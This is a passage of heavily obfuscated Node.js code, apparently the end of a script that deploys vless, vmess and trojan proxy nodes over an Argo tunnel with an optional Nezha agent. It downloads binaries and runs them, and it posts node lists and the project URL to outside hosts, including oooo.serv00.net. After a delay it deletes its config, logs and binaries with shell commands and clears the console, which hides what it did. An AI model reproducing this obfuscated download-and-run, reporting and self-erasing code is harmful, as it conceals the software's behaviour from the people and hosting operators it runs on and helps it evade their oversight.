_0x5cbcfa[_0xe92f2f(0x23c)][_0xe92f2f(_0x18bea9._0x5025e8)]+'_'+_0x5cbcfa[_0xe92f2f(0x23c)][_0xe92f2f(_0x18bea9._0x2c6bd8)];}catch(_0x3375b3){try{const _0x3cd24a=await axios['get'](_0xe92f2f(0x1ca),{'timeout':0xbb8});if(_0x3cd24a['data']&&_0x3cd24a[_0xe92f2f(0x23c)][_0xe92f2f(0x229)]===_0xe92f2f(_0x18bea9._0x5e6fc4)&&_0x3cd24a[_0xe92f2f(_0x18bea9._0xa5288b)][_0xe92f2f(_0x18bea9._0x51283e)]&&_0x3cd24a[_0xe92f2f(0x23c)][_0xe92f2f(0x18f)])return _0x3cd24a[_0xe92f2f(_0x18bea9._0xa5288b)][_0xe92f2f(_0x18bea9._0x2dbdbd)]+'_'+_0x3cd24a[_0xe92f2f(_0x18bea9._0x1c483b)][_0xe92f2f(0x18f)];}catch(_0x348728){}}return _0xe92f2f(0x181);}async function _0x13e3fe(_0x4740e0){const _0x3d8d0f=await _0x43599e(),_0x45f9a6=NAME?NAME+'-'+_0x3d8d0f:_0x3d8d0f;return new Promise(_0x22b2a2=>{const _0x1f817c={_0x515dfb:0x18c,_0x23167f:0x23b,_0x1265d8:0x1b1,_0x17fb90:0x1d1,_0x1551c4:0x1d3,_0x15ce38:0x1e8,_0x3c26c7:0x19d,_0x40bc50:0x1e8,_0xbed123:0x1e5},_0x34ffef={_0x4a77e4:0x1d3,_0x491dd4:0x234,_0x1de1fb:0x1b4};setTimeout(()=>{const _0x1d31eb=_0x2463,_0x39c415={'v':'2','ps':''+_0x45f9a6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x1d31eb(0x1fe),'host':_0x4740e0,'path':_0x1d31eb(0x1ed),'tls':_0x1d31eb(0x215),'sni':_0x4740e0,'alpn':'','fp':'firefox'},_0x170cdd=_0x1d31eb(_0x1f817c._0x515dfb)+UUID+'@'+CFIP+':'+CFPORT+_0x1d31eb(0x1df)+_0x4740e0+'&fp=firefox&type=ws&host='+_0x4740e0+_0x1d31eb(0x209)+_0x45f9a6+_0x1d31eb(_0x1f817c._0x23167f)+Buffer[_0x1d31eb(0x1d3)](JSON[_0x1d31eb(_0x1f817c._0x1265d8)](_0x39c415))['toString'](_0x1d31eb(0x1d2))+_0x1d31eb(0x17f)+UUID+'@'+CFIP+':'+CFPORT+_0x1d31eb(0x177)+_0x4740e0+'&fp=firefox&type=ws&host='+_0x4740e0+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x45f9a6+'\x0a\x20\x20\x20\x20';console[_0x1d31eb(_0x1f817c._0x17fb90)](Buffer[_0x1d31eb(_0x1f817c._0x1551c4)](_0x170cdd)[_0x1d31eb(_0x1f817c._0x15ce38)]('base64')),fs[_0x1d31eb(_0x1f817c._0x3c26c7)](subPath,Buffer[_0x1d31eb(0x1d3)](_0x170cdd)[_0x1d31eb(_0x1f817c._0x40bc50)]('base64')),console[_0x1d31eb(_0x1f817c._0x17fb90)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1d31eb(_0x1f817c._0xbed123)]('/'+SUB_PATH,(_0xd096c4,_0x4da164)=>{const _0x207bc=_0x1d31eb,_0x5c8375=Buffer[_0x207bc(_0x34ffef._0x4a77e4)](_0x170cdd)[_0x207bc(0x1e8)](_0x207bc(0x1d2));_0x4da164['set'](_0x207bc(_0x34ffef._0x491dd4),_0x207bc(0x191)),_0x4da164[_0x207bc(_0x34ffef._0x1de1fb)](_0x5c8375);}),_0x22b2a2(_0x170cdd);},0x7d0);});}}async function uploadNodes(){const _0x4c2094={_0x1d61ec:0x20b,_0xdba85a:0x20d,_0x231ae0:0x229,_0xd0f364:0x1aa,_0x92db4d:0x230,_0xc73e76:0x1c5,_0x5337a6:0x1d1,_0x586a84:0x204},_0x31a557=_0x2260a3;if(UPLOAD_URL&&PROJECT_URL){const _0x5ace7f=PROJECT_URL+'/'+SUB_PATH,_0x4a58ba={'subscription':[_0x5ace7f]};try{const _0x30fbdc=await axios[_0x31a557(0x217)](UPLOAD_URL+_0x31a557(0x1ba),_0x4a58ba,{'headers':{'Content-Type':_0x31a557(_0x4c2094._0x1d61ec)}});return _0x30fbdc&&_0x30fbdc[_0x31a557(0x229)]===0xc8?(console['log'](_0x31a557(0x1bb)),_0x30fbdc):null;}catch(_0x35dab6){if(_0x35dab6[_0x31a557(_0x4c2094._0xdba85a)]){if(_0x35dab6[_0x31a557(_0x4c2094._0xdba85a)][_0x31a557(_0x4c2094._0x231ae0)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x31a557(_0x4c2094._0xd0f364)](listPath))return;const _0xb27175=fs[_0x31a557(_0x4c2094._0x92db4d)](listPath,'utf-8'),_0x4aebcf=_0xb27175[_0x31a557(0x19c)]('\x0a')['filter'](_0x28df78=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x31a557(0x1b6)](_0x28df78));if(_0x4aebcf[_0x31a557(_0x4c2094._0xc73e76)]===0x0)return;const _0x5254b6=JSON[_0x31a557(0x1b1)]({'nodes':_0x4aebcf});try{const _0x17c223=await axios[_0x31a557(0x217)](UPLOAD_URL+_0x31a557(0x1bc),_0x5254b6,{'headers':{'Content-Type':'application/json'}});return _0x17c223&&_0x17c223['status']===0xc8?(console[_0x31a557(_0x4c2094._0x5337a6)](_0x31a557(_0x4c2094._0x586a84)),_0x17c223):null;}catch(_0x560c1b){return null;}}else return;}}function cleanFiles(){const _0x3094ba={_0x43854c:0x21e};setTimeout(()=>{const _0x29c236={_0x24afb6:0x1d1,_0x45b074:0x1db},_0x225ada=_0x2463,_0x399ee0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x399ee0[_0x225ada(0x19b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x399ee0['push'](phpPath);process['platform']==='win32'?exec(_0x225ada(0x1b0)+_0x399ee0['join']('\x20')+_0x225ada(0x1c2),_0x14251b=>{const _0x276b1d=_0x225ada;console[_0x276b1d(_0x3094ba._0x43854c)](),console[_0x276b1d(0x1d1)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x225ada(0x18e)+_0x399ee0['join']('\x20')+_0x225ada(0x22c),_0x21131a=>{const _0x308748=_0x225ada;console['clear'](),console[_0x308748(0x1d1)](_0x308748(0x220)),console[_0x308748(_0x29c236._0x24afb6)](_0x308748(_0x29c236._0x45b074));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xebabed={_0x246654:0x1dd,_0x21c6d4:0x217,_0x543b57:0x1d1,_0x149eff:0x179},_0x44f59a=_0x2260a3;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x44f59a(0x1d1)](_0x44f59a(_0xebabed._0x246654));return;}try{const _0x5a6cbc=await axios[_0x44f59a(_0xebabed._0x21c6d4)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x44f59a(_0xebabed._0x543b57)](_0x44f59a(_0xebabed._0x149eff)),_0x5a6cbc;}catch(_0x533184){return console[_0x44f59a(0x189)](_0x44f59a(0x1c8)+_0x533184['message']),null;}}async function startserver(){const _0x53f49d={_0x3ea91b:0x189,_0xad92e1:0x1d9},_0x2f0c93=_0x2260a3;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x8841da){console[_0x2f0c93(_0x53f49d._0x3ea91b)](_0x2f0c93(_0x53f49d._0xad92e1),_0x8841da);}}startserver()[_0x2260a3(0x1c6)](_0x4508de=>{const _0x1fd65a={_0x242c8d:0x189},_0x216b4c=_0x2260a3;console[_0x216b4c(_0x1fd65a._0x242c8d)]('Unhandled\x20error\x20in\x20startserver:',_0x4508de);}),app[_0x2260a3(0x1cf)](PORT,()=>console[_0x2260a3(0x1d1)](_0x2260a3(0x180)+PORT+'!'));